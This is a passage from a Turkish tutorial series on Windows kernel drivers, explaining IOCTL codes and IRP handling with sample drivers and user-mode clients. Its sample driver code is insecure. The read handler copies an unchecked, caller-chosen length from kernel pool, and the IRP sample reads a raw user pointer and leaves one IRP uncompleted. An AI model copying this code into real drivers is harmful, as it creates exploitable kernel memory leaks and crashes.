tanımlanmış kodlar da olabilir. Bu standart IOCTL kodları, Windows’un donanım ve yazılım bileşenleri arasındaki iletişimi standartlaştırmak ve kolaylaştırmak amacıyla sağlanır. Örneğin, bazı IOCTL kodları, donanım cihazlarının özelliklerini sorgulama veya belirli işlemleri başlatma gibi genel görevler için kullanılır. Geliştiriciler, özel ihtiyaçlarına göre bu kodları özelleştirebilir veya yeni kodlar tanımlayabilirler, bu da esneklik ve genişletilebilirlik sağlar.\nCode Önceki konumuzda olduğu gibi user-mode program ve kernel-mode sürücümüzü oluşturacağız.\nSenaryoda IOCTL_MEM_ALLOCATE kodu aracılığıyla user-mode uygulaması sürücüye kernel-space alanında bellek ayırması için kod ve bir veri gönderecek. Öte yandan oluşturacağımız IOCTL_MEM_READ kodu ile sürücümüz, bellek adresten veriyi alıp user-mode programa gönderecek.\nGithub linki için buraya tıklayabilirsiniz.\nKernel Mode - Driver Öncekikle sürücümüzü kodlayarak başlayalım:\n#include \"main.h\" #define TAG 'beko' #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) PVOID GlobalMemoryAddr = NULL; NTSTATUS IoCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); NTSTATUS status = STATUS_SUCCESS; switch (Stack-\u003eMajorFunction) { case IRP_MJ_CREATE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; case IRP_MJ_CLOSE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; default: status = STATUS_INVALID_DEVICE_REQUEST; break; } Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } DbgPrintEx(0, 0, \"Data from UserLand program: %.*s\", Length, UserBuffer); GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(DriverObject-\u003eDeviceObject); return STATUS_SUCCESS; } Önceki IRP konusuna aşina olduysanız zaten hemen hemen benzer kod olduğunu anlamışsınızdır. Şimdi detaylıca göz atalım:\n#define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) Her şeyden önce konumuzla ilgisi olan tanımladığımız IOCTL kodlarına bir bakalım.\nCTL_CODE makrosu, IOCTL kodlarını tanımlamak için kullanılır ve bu makro, çeşitli parametrelerle birlikte bir IOCTL kodu oluşturur. Parametreler şunlardır:\nDeviceType: Cihaz türünü belirtir. Bu, FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD gibi veya diğerlerinden biri olabilir. Burada kullandığımız FILE_DEVICE_UNKNOWN, belirli bir cihaz türü belirtmediğimiz ve genel bir cihaz tipi kullandığımız anlamına gelir.\nFunctionCode: IOCTL işleminin benzersiz bir kodunu belirler. Bu, işlemi tanımlayan bir sayıdır ve genellikle uygulama veya sürücü tarafından belirlenen bir değerdir. Örneğin, 0x800 ve 0x801 gibi değerler olabilir.\nMethod: IOCTL işleminin veriyi nasıl ileteceğini tanımlar. Bu parametreler METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, ve METHOD_NEITHER gibi seçenekler bulunur. Kodumuzdaki METHOD_BUFFERED seçeneği, verinin bir bellek tamponu aracılığıyla taşınmasını ifade eder.\nAccess: IOCTL işleminin hangi erişim izinlerine sahip olduğunu belirtir. Bu parametre için FILE_ANY_ACCESS, FILE_SHARE_READ, FILE_SHARE_WRITE gibi seçenekler kullanılabilir. Kodumuzdaki FILE_ANY_ACCESS, işlemin herhangi bir erişim iznine sahip olduğunu ifade eder.\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; İlk olarak DriverEntry DeviceName ve SymName adında iki adet UNICODE_STRING tanımladık. Bu iki değişken, sürücümüzün adını ve sembolik adını tutmaktadır. Bu değişkenlerle, sürücümüzün adını ve sembolik adını belirlemek için kullanacağız.\nStatus = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygıt nesnesi oluşturuyoruz. Bu fonksiyon, sürücümüz için bir aygıt nesnesi oluşturur ve bu nesneyi DeviceObject değişkenine atar.\nStatus = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir bağlantı oluşturuyoruz. Bu sayede, user mode programımızda sürücünün adını ve sembolik adını kullanarak sürücümüze erişiyor olacağız.\nDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; Son olarak, sürücüde IRP istekleri için IRP_MJ_CREATE, IRP_MJ_CLOSE ve IRP_MJ_DEVICE_CONTROL fonksiyonlarını belirliyoruz. Bu fonksiyonlar, gelecek IRP isteklerini işleyecek olan fonksiyonlardır. Ayrıca, sürücümüzün yüklenmesi sırasında çağrılacak olan UnloadDriver fonksiyonunu belirliyoruz.\nŞimdi ise IOCTL kodlarını işleyecek fonksiyona göz atalım:\nPIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; İlk olarak IoGetCurrentIrpStackLocation fonksiyonu ile mevcut IRP yığın konumunu alıyoruz. Daha sonra, user-mode programımızın gönderdiği veriyi almak için Irp-\u003eAssociatedIrp.SystemBuffer kullanıyoruz. Ayrıca, IRP’nin giriş ve çıkış veri boyutlarını almak için Stack-\u003eParameters.DeviceIoControl.OutputBufferLength ve Stack-\u003eParameters.DeviceIoControl.InputBufferLength kullanarak alıyoruz. Son olarak, bellek tahsis etmek için kullanacağımız TAG değerini tanımlıyoruz.\nswitch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); İlk olarak Stack-\u003eParameters.DeviceIoControl.IoControlCode ile user-mode’ın gönderdiği IOCTL kodunu alıyoruz. Hangi kod gönderildiyse ona göre işlemleri yapacağız.\nEğer IOCTL_MEM_ALLOCATE kodu gelmişse, öncelikle UserBuffer’ın ve Length’in kontrolünü yapıyoruz. Eğer UserBuffer NULL ise veya Length 0 ise, hatalı parametre hatası döndürüyoruz. Daha sonra, ExAllocatePool2 fonksiyonu ile kernel-space tarafında bellek tahsis ediyoruz. Eğer bellek tahsis edilemezse, yetersiz kaynak hatası döndürüyoruz. Son olarak, RtlCopyMemory fonksiyonu ile user-mode’dan gelen veriyi kernel-mode belleğe kopyalıyoruz.\nEğer IOCTL_MEM_READ kodu gelmişse, kernel-space alanından ayrılan bellek adresinden veriyi alıp UserBuffer’a kopyalıyoruz ve Output olarak veriyi user-mode programa gönderiyoruz.\ndefault kısmında ise geçersiz bir IOCTL kodu gönderildiğinde hata döndürerek isteği bitiriyoruz.\nUser Mode - Program Şimdi ise user-mode programımıza göz atalım:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) int main(int argc, char* argv[]) { HANDLE HandleDevice = NULL; CHAR InBuffer[] = \"Piyanis bana biraaak\"; CHAR OutBuffer[sizeof(InBuffer)] = { 0 }; DWORD InputBytesReturned = 0; DWORD OutputBytesReturned = 0; BOOL Result = 0; HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); return 0; } User-mode kodumuzda bu. Şimdi detaylıca göz atalım:\n#define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) User-mode programımızda ilk olarak iletişim kuracağımız sürücünün ismini ve yukarıda bahsettiğim aynı CTL kodlarını tanımlıyoruz.\nHandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kısımda ise CreateFile aracılığıyla sürücümüzle iletişime geçiyoruz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kısımda ise DeviceIoControl aracılığıyla sürücümüze IOCTL_MEM_ALLOCATE kodunu gönderiyoruz. Eğer IOCTL kodu başarılı bir şekilde gönderilmezse hata döndürüyoruz.\nParametrelere dikkat edin. Bizim şuan bu kod parçasındaki amacımız kernel-space alanından bir bellek ayrımı yapmak ve gönderdiğimiz veriyi yazdırması. Veri göndermek için Input olarak verimizi ve uzunluğunu gönderiyoruz. Birazdan veri alırken bunu output için yaptığımızı göreceksiniz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); Artık verimiz kernel alanına yazıldı ve tekrar IOCTL_MEM_READ kodunu göndererek kernel-space alanından veriyi alıyoruz. Bu sefer ise sürücümüz bize veri göndereceği için göndereceği verileri OutBuffer değişkenie aktarıyoruz. Son olarak ise alınan veriyi ekrana yazdırıyoruz.\nTekrardan parametrelere dikkat edin. Bu sefer Input parametreleri için NULL ve 0 gönderiyoruz. Çünkü sadece veri alacağız. Output olarak ise OutBuffer ve OutBuffer’ın uzunluğunu veriyoruz.\nSürücü ve Programın Çalıştırılması Öncelikle sürücümüzü sisteme yükleyip ardından çalıştıralım:\nArdından user-mode programını çalıştıralım:\nGöründüğü gibi programımızı çalıştırdığımızda Windbg’dan user-mode programın gönderdiği veriyi ekrana bastırdığını, ardından sürücünün user-mode programına gönderdiği veriyi ekrana bastırdığını görebiliriz.\nSonuç Bu konumuzda IOCTL hakkında bilgi verdim ve basit bir örnek üzerinden nasıl kullanıldığını gösterdim. Umarım bu mekanizmayi daha iyi anlamanıza yardımcı olmuştur.\nİyi çalışmalar dilerim 🚀🚀\nReferences Windows Docs - Introduction to I/O Control Codes Windows Docs - Device Input and Output Control ","sonuç#Sonuç":"","sürücü-ve-programın-çalıştırılması#Sürücü ve Programın Çalıştırılması":""},"title":"IOCTL"},"/tr/docs/winkernel-dev/wkd-irp/":{"data":{"":"","code#Code":"","io-request-packet-irp-nedir#I/O Request Packet (IRP) Nedir?":"","references#References":"Merhabalar, Windows Kernel Development’ın ilk serisi olarak bu konuda sizlere I/O Request Packet (IRP) konusunu inceleyeceğiz.\nI/O Request Packet (IRP) Nedir? I/O Request Packet, kısaca IRP, Windows işletim sisteminde sürücüler ile işletim sistemi arasında bilgi alışverişini sağlayan bir yapıdır. Bunu bir “mesaj taşıyıcısı” gibi düşünebilirsiniz.\nGenellikle, sürücülere gönderilen talepler IRP olarak adlandırılan bu paketlerle gönderilir. Bir işletim sistemi bileşeni veya sürücü, IRP’yi bir sürücüye iletmek için IoCallDriver adlı bir fonksiyonu kullanır. Bu fonksiyon, bir aygıt nesnesi (DEVICE_OBJECT) ve bir IRP’yi işaret eden iki bilgi alır. Aygıt nesnesi, bu aygıtla ilişkili sürücüyü (DRIVER_OBJECT) işaret eder. Bu yüzden, IoCallDriver fonksiyonu çağrıldığında, IRP, ilgili aygıt nesnesine veya bu nesneyle ilişkili sürücüye gönderilir. Bazen bu işlem için “IRP’yi iletmek” veya “IRP’yi aktarmak” gibi ifadeler de kullanılır.\nBir IRP, genellikle birden fazla sürücü tarafından işlenir ve bu sürücüler belirli bir sıraya göre düzenlenmiştir. IRP işlenirken, sürücüler yığının her bir katmanı gibi ele alınır. Yani, IRP önce yığının en üstündeki sürücüye gelir. Her sürücü, IRP’yi belirli bir sırayla işler ve gerekli işlemi yapar. İşlem tamamlandığında, IRP bir sonraki sürücüye geçer. Bu süreç, IRP’nin adım adım işlenmesini sağlar. Sonuç olarak, IRP tüm sürücülerden geçtikten sonra nihai işlem gerçekleştirilir ve istenen sonuç elde edilir.\nIRP, kullanıcı tarafından başlatılan bir işlemin işletim sisteminin çekirdeği tarafından işlenmesini de sağlar. Bu yapı sayesinde, sürücüler talepleri doğru bir şekilde alır ve yanıt verir. Örneğin, bir dosya yazdırmak istediğinizde, bu talep IRP olarak yazıcı sürücüsüne gönderilir. Yazıcı sürücüsü, IRP’yi alır ve yazdırma işlemini başlatır. Bu sistem, kullanıcı işlemleri ile donanım arasındaki bağlantıyı güvenli ve verimli bir şekilde sağlar.\nCode Örnek kod için iki ayrı proje oluşturacağız. İlk projede bir sürücü oluşturacağız ve IRP’in nasıl işleneceğinden bahsedeceğim. Diğer proje ise user mode bir program oluşturacağız ve bu programda WriteFile fonksiyonunu kullanarak sürücüye IRP göndermeyi göstereceğim.\nAyrıca Github link için buraya tıklayabilirsiniz.\nKernel Mode Driver #include \"main.h\" NTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); Irp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; DbgPrintEx(0, 0, \"\\n\\nMJ_WRITE Received!\\n\"); if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } DbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT PDrvObj, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Status = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } PDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT PDrvObj) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(PDrvObj-\u003eDeviceObject); return STATUS_SUCCESS; } Çok uzun gözüksede emin olun çok basit bir sürücü kodu. Adım adım kodlara bakalım ve DriverEntry fonksiyonundan başlayalım:\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; İlk olarak DeviceName ve SymName adında iki adet UNICODE_STRING tanımladık. Bu iki değişken, sürücümüzün adını ve sembolik adını tutmaktadır. Bu değişkenlerle, sürücümüzün adını ve sembolik adını belirlemek için kullanacağız.\nStatus = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygıt nesnesi oluşturuyoruz. Bu fonksiyon, sürücümüz için bir aygıt nesnesi oluşturur ve bu nesneyi DeviceObject değişkenine atar.\nStatus = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir bağlantı oluşturuyoruz. Bu sayede, user mode programımızda sürücünün adını ve sembolik adını kullanarak sürücümüze erişiyor olacağız.\nPDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; Son olarak, sürücümüzün IRP işlevlerini belirliyoruz. Bu işlevler, sürücümüzün IRP’leri nasıl işleyeceğini belirler. Kodlarda ise, IrpCreate ve IrpWrite kullanıyoruz. MJ_CREATE, bir dosya oluşturulduğunda sürücümüzün ne yapacağını belirler. IrpWrite ise bir dosyaya yazıldığında sürücümüzün ne yapacağını belirler. IRP’ler, bu işlevler aracılığıyla sürücümüze iletilir ve sürücümüz bu işlevler aracılığıyla IRP’leri işler.\nŞimdi ise IRP isteklerini işleyecek fonksiyonlarımıza göz atalım:\nNTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); ... İlk olarak IrpCreate’e baktığımızda DeviceObject ve Irp parametrelerini alır. Bu parametreler, yukarıda bahsettiğim gibi sürücümüzün aygıt nesnesini ve IRP’yi temsil eder. Daha sonra DbgPrintEx fonksiyonu ile bir bilgi mesajı yazdırıyoruz.\nIrp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; MJ_CREATE fonksiyonun son kısmında ise IRP’nin durumunu ve bilgisini ayarlıyoruz. Bu durum ve bilgi, IRP’nin işlem sonucunu belirler. Son olarak, IoCompleteRequest fonksiyonu ile IRP’yi tamamlıyor ve işlemi sonlandırıyoruz.\nŞimdi ise IrpWrite fonksiyonuna bakalım:\nNTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; ... Tanımlanan değişkenlere göz atalım:\nStack değişkeni, IRP’nin yığın konumunu temsil eder. Buffer değişkeni, IRP’nin veri alanını temsil eder. Bu veri alanı, IRP’nin taşıdığı veriyi içerir. Length değişkeni, IRP’nin veri uzunluğunu temsil eder. Bu uzunluk, IRP’nin taşıdığı verinin uzunluğunu belirtir. if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } İlk olarak, Buffer işaretçisinin NULL olup olmadığı ve Length değerinin 0 olup olmadığı kontrol ediyoruz.\nEğer koşul sağlanıyorsa yani veri alınmamışsa Irp-\u003eIoStatus.Status ile değeri STATUS_INVALID_PARAMETER olarak ayarlıyoruz. Bu, bir parametre hatası olduğunu belirtir. Irp-\u003eIoStatus.Information değeri 0 olarak ayarlıyoruz. Sonda ise IRP’nin işlem durumu döndürülerek işleme son verilir.\nDbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; Bu kısımda ise eğer veri düzgünce alınmışsa bu veriyi yazdırırız. Daha sonra aynı şekilde IRP’nin durumunu ve bilgisini ayarlarız ve işlemi sonlandırırız.\nUser Mode Program Şimdi ise user mode programımızı oluşturalım. Bu programda WriteFile fonksiyonunu kullanarak sürücümüze IRP göndereceğiz.\n#include \"main.h\" int main(int argc, char* argv[]) { HANDLE\tHandleDevice = NULL; CHAR\tBuffer[] = \"Hello, kernel!\"; DWORD\tBytesWritten = 0; DWORD\tBytesRead = 0; BOOL\tStatus\t= 0; HandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Status = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } CloseHandle(HandleDevice); return 0; } User mode program kodlarımız da bu şekilde. Şimdi detaylıca göz atalım:\nHandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Programımızda ilk olarak CreateFile aracılığıyla sürücümüzü açıyoruz. Bu fonksiyon, sürücümüzü açar ve bir kolu (HANDLE) döndürür.\n“CreateFile kullanılarak sürücü mü açılıyor?” diye düşünen olabilir. Bilmeyenler için CreateFile fonksiyonu, Windows işletim sisteminde bir dosya veya aygıt nesnesi oluşturmak veya açmak için kullanılabilir. Daha fazla araştırma için dökümanlara bakabilirsiniz.\nStatus = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } Bu kısımda ise WriteFile fonksiyonu aracılığıyla sürücümüze IRP isteği gönderiyoruz.\nSürücünün ve Programın Çalıştırılması Öncelikle sürücümüzü windbg’a bağlı sanal makineye yüklememiz ve ardından başlatmamız gerekecek:\nŞimdi ise user mode programımızı çalıştıralım:\nGöründüğü gibi user mode programımı çalıştırdığımızda sürücüye veri gönderdiğini ve gönderilen veriyi ekrana yazdırdığını gördük:\nUser mode program tarafından MJ_WRITE IRP isteğinin geldiğini ve işlediğini böylece görmüş oluyoruz.\nSonuç Bu yazıda IRP’nin ne olduğunu, nasıl oluşturulduğunu ve nasıl kullanıldığını öğrendik. Ayrıca, IRP’nin sürücüler ve işletim sistemi arasında nasıl bir köprü görevi gördüğünü de öğrendik. Bu konuda daha fazla bilgi edinmek isterseniz, Microsoft Docs’ta bulunan kaynaklara göz atabilirsiniz.\nUmarım faydalı bir 